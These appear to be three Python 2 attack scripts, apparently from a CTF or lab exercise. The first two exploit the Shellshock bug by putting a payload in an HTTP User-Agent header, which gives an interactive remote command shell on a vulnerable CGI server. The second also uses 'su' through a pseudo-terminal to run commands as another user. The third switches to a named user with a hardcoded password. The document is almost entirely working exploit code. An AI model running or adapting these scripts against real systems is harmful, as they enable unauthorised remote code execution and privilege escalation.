import requests, sys
from base64 import b64encode

while True:
    command = b64encode(raw_input('$ ').strip())
    headers = {
        'User-Agent': '() { :; }; echo \'Content-type: text/html\'; echo; export PATH=$PATH:/usr/bin:/bin:/sbin; echo \'%s\' | base64 -d | sh 2>&1' % command
    }

    print requests.get('<url>', headers=headers).text.strip()

###############################################################################################################################
import requests, sys
from base64 import b64encode

while True:
  user_command = b64encode(raw_input('$ ').strip())

  payload = b64encode("python -c 'from base64 import b64decode;import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen([\"/bin/su\",\"-c\",b64decode(\"%s\"),\"<user>\"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,\"<password>\\n\");time.sleep(0.1);print os.read(master,1024);'"%user_command)
  headers = {
    'User-Agent': '() { :; }; echo \'Content-type: text/html\'; echo; export PATH=$PATH:/usr/bin:/bin:/sbin; echo \'%s\' | base64 -d | sh 2>&1' % payload
  }

  print requests.get('<url>', headers=headers).text.strip()

###############################################################################################################################
import pty,subprocess,os,time
(master, slave) = pty.openpty()
p = subprocess.Popen(['su', '-c', 'id', 'bynarr'], stdin=slave, stdout=slave, stderr=slave)
os.read(master, 1024)
os.write(master, 'fruity\n')
time.sleep(0.1)
print os.read(master, 1024)
